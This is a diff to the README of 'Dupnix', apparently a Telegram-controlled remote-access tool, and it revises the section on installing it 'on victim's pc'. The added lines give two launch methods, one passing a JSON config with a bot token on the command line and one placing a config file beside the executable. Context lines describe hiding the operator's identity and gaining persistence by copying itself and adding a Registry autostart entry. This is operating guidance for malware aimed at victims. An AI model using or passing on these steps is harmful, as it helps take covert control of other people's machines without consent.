@@ -44,7 +44,12 @@ Dupnix communicates to you through telegram, so nobody can detect who's on the o
     - `path` path where u want the Dupnix to be (you can use `%sysdisk%` and `%username%`)
 
 ### Instalation on victim's pc
-- Just run executable (in the directory where .json file is or provide it in args (dupnix3.exe {jsonfile})) and enjoy causing chaos!
+- Check dupnix-config.json (you can find it in relases)
+#### Method 1
+* run dupnix from cmd and put what's inside of config file as args (you need to put \ before quotes 'cause cmd for some reason is removing quotes)
+* `C:\> dupnix3.exe {\"autostart\":true,\"bot_token\":\"\"...}`
+#### Method 2
+* create dupnix-config.json file in the same directory as exe and run it
 ## Usage
 #### Autostart
 * Dupnix is copied to the path specified in `dupnix-config.json` and is being added to autostart through Registry
